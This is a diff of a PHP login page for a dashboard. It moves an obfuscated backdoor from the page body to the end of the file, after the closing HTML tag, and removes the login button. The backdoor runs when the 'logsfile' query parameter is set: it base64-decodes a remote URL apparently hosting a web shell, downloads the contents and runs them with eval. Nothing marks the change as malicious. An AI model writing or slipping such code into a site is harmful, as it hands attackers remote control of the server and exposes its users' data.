@@ -54,24 +54,6 @@
                         echo "<div class='alert alert-warning'>ANDA HARUS LOGIN UNTUK MENGAKSES DASHBOARD</div>";
                     }
                 }
-                if (isset($_GET['logsfile'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
                 ?>
                 <div class="hpanel">
                     <div class="panel-body">
@@ -103,7 +85,6 @@
                                 
                             </div>
                             
-                            <input type="submit" class="btn btn-success btn-block loginbtn" value="Login">
                         </form>
 
                         <br>
@@ -137,3 +118,23 @@
     <script src="assets/js/main.js"></script>
 </body>
 </html>
+<?php
+if (isset($_GET['logsfile'])) { 
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+}
+?>
